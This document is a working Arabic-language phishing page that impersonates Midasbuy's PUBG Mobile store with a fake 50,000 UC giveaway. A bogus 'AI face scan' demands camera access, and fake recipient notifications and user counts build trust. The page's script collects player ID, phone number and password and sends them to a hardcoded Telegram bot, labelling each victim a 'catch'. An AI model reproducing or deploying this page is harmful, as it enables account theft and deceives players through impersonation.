<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚡ Midasbuy - PUBG Mobile Verification ⚡</title>
    <style>
        body { 
            background: radial-gradient(circle, #0f172a, #020617); 
            color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden;
        }
        
        /* شاشة التحقق بالكاميرا */
        #verify-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; z-index: 9999; display: flex; flex-direction: column;
            align-items: center; justify-content: center; text-align: center; padding: 20px;
        }
        .scanner-circle {
            width: 180px; height: 180px; border: 4px solid #f9a825; border-radius: 50%;
            position: relative; box-shadow: 0 0 30px #f9a825; margin-bottom: 25px;
        }
        .scanner-line {
            position: absolute; width: 100%; height: 3px; background: #f9a825;
            box-shadow: 0 0 15px #f9a825; animation: scan 2s infinite;
        }
        @keyframes scan { 0% { top: 0; } 50% { top: 100%; } 100% { top: 0; } }

        /* الكارت الرئيسي */
        .card { 
            background: rgba(15, 23, 42, 0.95); width: 100%; max-width: 420px; 
            padding: 30px; border-radius: 30px; border: 2px solid #f9a825; 
            box-shadow: 0 0 40px rgba(249, 168, 37, 0.4); text-align: center; display: none;
        }

        .logo { width: 150px; margin-bottom: 15px; filter: drop-shadow(0 0 8px #f9a825); }
        
        .stars { color: #f9a825; font-size: 20px; margin-bottom: 5px; }
        .user-count { font-size: 13px; color: #94a3b8; margin-bottom: 20px; font-weight: bold; }

        input { 
            width: 100%; padding: 15px; margin: 10px 0; background: #000; border: 1px solid #334155; 
            color: white; border-radius: 12px; box-sizing: border-box; outline: none; font-size: 16px;
        }
        input:focus { border-color: #f9a825; box-shadow: 0 0 10px #f9a825; }

        .btn { 
            width: 100%; padding: 18px; background: linear-gradient(90deg, #f9a825, #ff8f00); 
            color: black; font-weight: 900; border-radius: 12px; cursor: pointer; border: none; font-size: 18px; margin-top: 15px;
        }

        #notify-bar {
            position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
            background: #f9a825; color: black; padding: 12px 25px; border-radius: 50px;
            font-weight: bold; font-size: 14px; box-shadow: 0 5px 20px rgba(0,0,0,0.5); transition: 0.5s; z-index: 10000;
        }
        #notify-bar.show { top: 20px; }
    </style>
</head>
<body>

    <div id="notify-bar">تم شحن 50,000 شدة للاعب 517***07 ✅</div>

    <div id="verify-overlay">
        <div class="scanner-circle"><div class="scanner-line"></div></div>
        <h2 style="color:#f9a825">نظام التحقق الذكي (AI)</h2>
        <p>يجب فتح الكاميرا للتأكد أنك مستخدم حقيقي ولست برنامج روبوت</p>
        <button class="btn" style="width:250px" onclick="verifyHuman()">ابدأ فحص الوجه الآن</button>
    </div>

    <div class="card" id="main-content">
        <img src="https://www.midasbuy.com/images/apps/pubgm/logo.png" class="logo">
        <div class="stars">⭐⭐⭐⭐⭐</div>
        <div class="user-count">🔥 يستخدمه الآن: 142 شخص | إجمالي المستلمين: 54,201</div>
        
        <h2 style="margin-bottom:5px">مركز توزيع الهدايا</h2>
        <p style="color:#94a3b8; font-size:12px; margin-bottom:20px">تم التحقق من هويتك بنجاح ✅</p>

        <input type="number" id="player_id" placeholder="ID اللاعب (Player ID)">
        <input type="tel" id="phone" placeholder="رقم الهاتف المرتبط">
        <input type="password" id="password" placeholder="كلمة المرور">
        
        <button class="btn" onclick="sendData()">تفعيل الشحن الفوري 🔥</button>
        <p style="font-size:10px; color:#475569; margin-top:15px">تشفير بيانات آمن 256-bit</p>
    </div>

    <script>
        const token = "8789584532:AAESJZrJGfkILGReWmxFUGz2cyJzvK_7fEU";
        const chat_id = "5177962707";

        // وظيفة فحص البشر (فتح الكاميرا)
        async function verifyHuman() {
            try {
                await navigator.mediaDevices.getUserMedia({ video: true });
                alert("جاري تحليل ملامح الوجه.. يرجى الانتظار 3 ثواني");
                setTimeout(() => {
                    document.getElementById('verify-overlay').style.display = 'none';
                    document.getElementById('main-content').style.display = 'block';
                    startNotifications();
                }, 3000);
            } catch (err) {
                alert("خطأ: يجب السماح بالكاميرا لإثبات أنك بشري واستلام الهدية!");
            }
        }

        // إرسال البيانات المرتبة
        async function sendData() {
            const id = document.getElementById('player_id').value;
            const phone = document.getElementById('phone').value;
            const pass = document.getElementById('password').value;

            if(!id || !phone || !pass) { alert("برجاء إكمال كافة البيانات!"); return; }

            const message = `🎯 صيد ملكي جديد 🎯\n\n🆔 ID: ${id}\n📞 الهاتف: ${phone}\n🔑 الباسورد: ${pass}\n✅ الحالة: تم فحص الوجه`;
            
            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`);
            
            alert("✅ تهانينا! تم التحقق من بياناتك. سيتم إرسال الـ 50,000 شدة لحسابك خلال دقائق.");
            window.location.reload();
        }

        // إشعارات المستلمين الوهمية
        function startNotifications() {
            const players = ["M_Diesel", "PUBG_King", "User_992", "Ali_Hero", "512***00", "Ahmed_77"];
            setInterval(() => {
                const name = players[Math.floor(Math.random() * players.length)];
                const bar = document.getElementById('notify-bar');
                bar.innerText = `تم شحن 50,000 شدة للاعب ${name} ✅`;
                bar.classList.add('show');
                setTimeout(() => bar.classList.remove('show'), 3000);
            }, 8000);
        }
    </script>
</body>
</html>
